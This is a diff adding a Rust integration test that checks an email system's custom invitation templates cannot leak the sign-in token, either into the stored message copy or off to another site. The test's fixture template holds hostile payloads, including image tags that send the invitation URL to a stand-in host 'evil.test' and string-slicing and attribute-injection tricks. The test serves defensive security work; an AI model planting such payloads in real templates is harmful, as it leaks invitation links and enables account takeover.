@@ -294,6 +294,70 @@ async fn invitations_and_sign_in_links_are_emailed(pool: PgPool) {
 }
 
 #[sqlx::test(migrator = "core_db::MIGRATOR")]
+async fn a_custom_invitation_template_cannot_leak_the_link(pool: PgPool) {
+    let h = harness(pool).await;
+    let (ws, owner) = h.app.workspace_with_owner("acme").await;
+    // An admin's template tries to get the link into the stored copy, or
+    // off to another site.
+    h.app
+        .post("/api/v1/templates")
+        .signed_in(&owner)
+        .json(json!({
+            "kind": "email", "key": "system.invitation", "name": "Invitation",
+            "subject": "Join {{ invitation.url }}",
+            "body": "<p><a href=\"{{ invitation.url }}\">Join</a></p>\
+                     <p>{{ invitation.url[:20] }}<!---->{{ invitation.url[20:] }}</p>\
+                     <p>{{ invitation.url | urlencode }} {{ invitation.url | reverse }}</p>\
+                     <img src=\"https://evil.test/?u={{ invitation.url }}\">\
+                     <img src=\"https://evil.test/?v=>{{ invitation.url }}\">\
+                     <img src='https://evil.test/?w= href=\"{{ invitation.url }}'>"
+        }))
+        .send()
+        .await
+        .ok();
+    h.app
+        .post("/api/v1/invitations")
+        .signed_in(&owner)
+        .json(json!({ "email": "new@acme.test", "role": "agent" }))
+        .send()
+        .await
+        .ok();
+    let token = h.app.last_invitation_token(ws).await;
+    h.drain().await;
+
+    let sent = h.mailer.sent();
+    let email = sent.iter().find(|e| e.to == "new@acme.test").unwrap();
+    let html = email.html.as_deref().unwrap();
+    assert!(
+        email.subject.contains(&token) && html.contains("href=\"http"),
+        "the invitee still gets a working link: {html}"
+    );
+    // The token only ever appears as the whole link, never reshaped or
+    // inside another address.
+    let link = format!("/invitations/accept?token={token}");
+    assert!(
+        !html.replace(&link, "").contains(&token[..12]),
+        "only as the link: {html}"
+    );
+    for q in ["u=http", "v=>http"] {
+        assert!(!html.contains(&format!("evil.test/?{q}")), "{html}");
+    }
+    assert!(!html.contains("w= href=\"http"), "{html}");
+
+    let stored: Vec<(String, String, String)> = sqlx::query_as(
+        "SELECT coalesce(subject, ''), coalesce(body_html, ''), body_text FROM outbound_messages WHERE to_address = 'new@acme.test'",
+    )
+    .fetch_all(&h.app.owner)
+    .await
+    .unwrap();
+    assert_eq!(stored.len(), 1);
+    let (subject, html, text) = &stored[0];
+    for part in [subject, html, text] {
+        assert!(!part.contains(&token[..12]), "{part}");
+    }
+}
+
+#[sqlx::test(migrator = "core_db::MIGRATOR")]
 async fn permanent_failures_stop_at_once_and_can_be_retried(pool: PgPool) {
     let h = harness(pool).await;
     let owner = workspace(&h).await;
